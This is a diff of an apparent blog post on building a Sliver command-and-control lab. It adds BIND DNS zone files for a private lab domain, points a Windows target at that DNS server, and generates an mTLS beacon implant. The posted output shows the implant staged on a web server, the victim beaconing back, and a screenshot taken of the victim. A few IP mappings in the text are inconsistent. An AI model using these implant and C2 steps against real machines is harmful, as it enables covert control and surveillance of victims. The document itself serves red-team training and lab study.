@@ -56,10 +56,10 @@ In real world, we will actually be purchasing a domain so that we can use it as 
 ```
 +-------------------+                              +-------------------+
 |                   |                 Resolve DNS  |                   |
-|   DNS Server VM   +--- UDP 53  <------------------+   Target VM       |
-|     (Linux)       |                              |    (Windows)       |
+|   DNS Server VM   +--- UDP 53  <------------------+   Target VM      |
+|     (Linux)       |                              |    (Windows)      |
 |                   |                              |                   |
-|  192.168.122.185  |                +-------------+ 192.168.122.160   |
+|  172.16.76.129    |                +-------------+ 172.16.76.132     |
 |                   |                |             |                   |
 +-------------------+                |             +----+---------+----+
                                      |                  |         |
@@ -73,7 +73,7 @@ In real world, we will actually be purchasing a domain so that we can use it as 
          |  C2 Server +<-------------------------------+         |
          |   (Linux)  |                                          |
          |            |   WireGuard C2 Connection (UDP 53) <-----+
-         | 192.168.122.111                                       |
+         | 172.16.76.128                                         |
          +----------------+                                      |
                                                                  |
                                                                  v
@@ -262,9 +262,256 @@ profile named /usr/sbin/named flags=(attach_disconnected) {
     
 - Enhances security with DNSSEC and disables zone transfers
 
+Now that we have `apparmor` set up, let's run the command `systemctl restart apparmor` so that the changes take effect. 
+
+### Zone Directory Set-up
+
+Let's create a directory to store zone files using the command `mkdir -p /etc/bind/zones`. After running the command, Specify the forward and reverse zones for the lab network in `/etc/bind/named.conf.local` like this:
+
+```text
+zone "carabiner.local" {
+    type master;
+    file "/etc/bind/zones/db.carabiner.local";   # zone file path
+};
+
+zone "76.16.172.in-addr.arpa" {
+    type master;
+    file "/etc/bind/zones/db.76.16.172";    # 172.16.76.0/24
+};
+```
 
 
+ We are configuring `BIND`, the DNS server and to serve our custom lab domain `carabiner.local`, and handle reverse DNS lookups (i.e, IP -> Domain) for our internal network.
 
+Let's break down `named.conf.local` file. We are adding two zone declarations:
+
+```
+zone "carabiner.local" {
+    type master;
+    file "/etc/bind/zones/db.carabiner.local";   # zone file path
+};
+```
+
+- **Zone**: `carabiner.local`
+    
+    - This is your **internal lab domain** (like `sliver.carabiner.local`, `target.carabiner.local`).
+        
+- **Type**: `master`
+    
+    - This DNS server is the **authoritative source** for that domain.
+        
+- **File**: `/etc/bind/zones/db.carabiner.local`
+    
+    - This file will contain **A records** (like `target.carabiner.local` → `192.168.122.160`)
+
+```
+zone "76.16.172.in-addr.arpa" {
+    type master;
+    file "/etc/bind/zones/db.76.16.172";
+};
+```
+
+- **Zone**: `172.16.76.in-addr.arpa`
+    
+    - This is the **reverse zone** for the IP range `172.16.76.0/24`
+        
+    - It handles **PTR records** (like `172.16.76.128` → `target.carabiner.local`)
+        
+- **File**: `/etc/bind/zones/db.76.16.172`
+    
+    - This is where you'll define the reverse mapping entries.
+
+On to the forward zone specification, which goes into `/etc/bind/zones/db.carabiner.local`:
+
+```text
+$TTL    604800
+@       IN      SOA     ns.carabiner.local. admin.carabiner.local. (
+                              4         ; Serial
+                         604800         ; Refresh
+                          86400         ; Retry
+                        2419200         ; Expire
+                         604800 )       ; Negative Cache TTL
+
+; name servers - NS records
+    IN      NS      ns.carabiner.local.
+
+; name servers - A records
+ns.carabiner.local.          IN      A       172.16.76.129
+
+; 172.16.76.0/24 - A records
+target.carabiner.local.        IN      A      172.16.76.132
+sliver.carabiner.local.        IN      A      172.16.76.128
+```
+
+Just to have a really professional DNS setup, I also added support for reverse lookups. This is my content of `/etc/bind/zones/db.76.16.172` :
+
+```
+$TTL    604800
+@       IN      SOA     ns.carabiner.local. admin.carabiner.local. (
+                              4         ; Serial
+                         604800         ; Refresh
+                          86400         ; Retry
+                        2419200         ; Expire
+                         604800 )       ; Negative Cache TTL
+
+; name servers
+        IN      NS      ns.carabiner.local.
+
+; PTR Records
+129     IN      PTR     ns.carabiner.local.        ; 172.16.76.129
+128     IN      PTR     sliver.carabiner.local.    ; 172.16.76.128
+132     IN      PTR     target.carabiner.local.    ; 172.16.76.132
+```
+
+Now check all config files for errors with the following commands:
+
+- run `named-checkconf` to check the options: no output means no errors
+- run `named-checkzone labnet.local /etc/bind/zones/db.carabiner.local` and look for `OK`
+- run `named-checkzone 76.16.172.in-addr.arpa /etc/bind/zones/db.76.16.172` and look for OK
+
+Results for the above commands should look something like this:
+
+```
+root@dns-server:/etc/bind/zones# named-checkconf
+root@dns-server:/etc/bind/zones# named-checkzone carabiner.local /etc/bind/zones/db.carabiner.local
+zone carabiner.local/IN: loaded serial 4
+OK
+root@dns-server:~# named-checkzone 76.16.172.in-addr.arpa /etc/bind/zones/db.76.16.172
+zone 76.16.172.in-addr.arpa/IN: loaded serial 4
+OK
+```
+
+If everything is working correctly, restart bind with the command `systemctl restart bind9`.
+
+### Verification
+
+Now let's verify that the DNS resolution is working correctly.
+
+Go to our Sliver C2 Server and use the `dig` command to verify:
+
+```
+┌──(carabiner1㉿carabiner)-[~]
+└─$ dig +short @172.16.76.129 target.carabiner.local
+172.16.76.132
+```
+
+Below command will check whether reverse zone if working properly:
+
+```
+dig +short @172.16.76.129 -x 172.16.76.128
+```
+
+### DNS Configuration on Target
+
+Now we have the new DNS server set up properly. Let's configure the target Windows machine to use the DNS server. 
+
+Right-click the network tray icon in the lower right and change the adapter's settings so that it uses our new DNS server:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-windows-dns.png)
+
+By going to `sliver.carabiner.local`, we can now see that this DNS server is working. 
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-dns-very.png)
+
+## More on mTLS Transport
+
+```
+sliver > generate beacon --os windows --arch amd64 --format exe --seconds 5 --save /tmp/implant-domain-ip.exe --mtls sliver.carabiner.local,172.16.76.128
+
+[*] Generating new windows/amd64 beacon implant binary (5s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 25s
+[*] Implant saved to /tmp/implant-domain-ip.exe
+```
+
+```
+sliver > jobs
+
+[*] No active jobs
+
+sliver > mtls
+
+[*] Starting mTLS listener ...
+
+[*] Successfully started job #2
+
+sliver > jobs
+
+ ID   Name   Protocol   Port   Stage Profile 
+==== ====== ========== ====== ===============
+ 2    mtls   tcp        8888      
+```
+
+```
+┌──(carabiner1㉿carabiner)-[/var/www/html]
+└─$ ls -l *exe       
+-rwx------ 1 www-data   www-data   15833088 May 25 20:51 COLD_INCIDENT.exe
+-rwx------ 1 www-data   www-data   15847936 May 25 22:53 TRADITIONAL_GIFT.exe
+-rwx------ 1 carabiner1 carabiner1 15813632 May 28 07:20 implant-domain-ip.exe
+```
+
+```
+sudo chown www-data:www-data /var/www/html/implant-domain-ip.exe 
+```
+
+```
+sliver > mtls
+
+[*] Starting mTLS listener ...
+
+[!] rpc error: code = Unknown desc = listen tcp :8888: bind: address already in use
+
+[*] Beacon d5968297 SICK_CRECHE - 172.16.76.132:59583 (DESKTOP-R6MQCK6) - windows/amd64 - Wed, 28 May 2025 08:31:55 EDT
+```
+
+`udp.stream eq 60`
+
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wireshark1.png)
+
+`tls.handshake.extensions_server_name`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wireshark2.png)
+
+`tcp.port == 8888`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wireshark3.png)
+
+```
+sliver > use
+
+? Select a session or beacon: BEACON  d2736554  SICK_CRECHE       172.16.76.132:59647  DESKTOP-R6MQCK6  DESKTOP-R6MQCK6\win10  windows/amd64
+[*] Active beacon SICK_CRECHE (d2736554-1c9b-42a8-8e0b-8cd1e441f2dc)
+
+sliver (SICK_CRECHE) > screenshot
+
+[*] Tasked beacon SICK_CRECHE (39aaa63e)
+
+sliver (SICK_CRECHE) > tasks
+
+ ID         State     Message Type   Created                         Sent   Completed 
+========== ========= ============== =============================== ====== ===========
+ 39aaa63e   pending   Screenshot     Wed, 28 May 2025 08:50:54 EDT                    
+
+
+sliver (SICK_CRECHE) > tasks
+
+ ID         State     Message Type   Created                         Sent   Completed 
+========== ========= ============== =============================== ====== ===========
+ 39aaa63e   pending   Screenshot     Wed, 28 May 2025 08:50:54 EDT                    
+
+
+sliver (SICK_CRECHE) > tasks
+
+ ID         State     Message Type   Created                         Sent   Completed 
+========== ========= ============== =============================== ====== ===========
+ 39aaa63e   pending   Screenshot     Wed, 28 May 2025 08:50:54 EDT                    
+
+
+[+] SICK_CRECHE completed task 39aaa63e
+
+[*] Screenshot written to /tmp/screenshot_DESKTOP-R6MQCK6_20250528085105_266791135.png (110.7 KiB)
+```
 
 ## References
 - https://dominicbreuker.com/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/
